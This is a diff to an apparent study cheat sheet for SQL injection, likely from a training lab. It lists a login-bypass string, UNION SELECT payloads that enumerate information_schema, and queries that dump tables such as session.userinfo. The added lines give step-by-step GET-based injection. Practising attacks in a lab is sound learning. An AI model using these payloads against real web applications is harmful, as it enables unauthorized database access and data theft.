@@ -59,7 +59,7 @@ select username,passwd,sudentID from session.userinfo ;
 select name,cost,color from session.car ;
 ###-------------------###
 #Single quote to check sor SQL injection
-#Check for field santitzion
+#Check for field santitzion LOGIN
 'OR 1=' 1
 #Using Web Tools view post request Raw, copy the string into the url after the ?
 ###FOR SQL POST 
@@ -73,4 +73,12 @@ Audi 'UNION SELECT table_schema,table_name,colunm_name from information_schema.c
 Audi 'UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
 #edit statement to show contents of columns
 Audi 'UNION SELECT type,2,cost,color,year from session.car #
-
+### FOR SQL GET
+#After Selection field enter true statement OR 1=1 on all URL options 
+#Determine number of displayed fields 
+UNION SELECT 1,2,3
+#Change golden statement to reflect how feilds are displayed 
+UNION SELECT table_schema,column_name,table_name from information_schema.columns
+#                 (1)         (3)         (2) 
+#continue on using same stratagy as POST 
+UNION SELECT cost,color,year from session.car
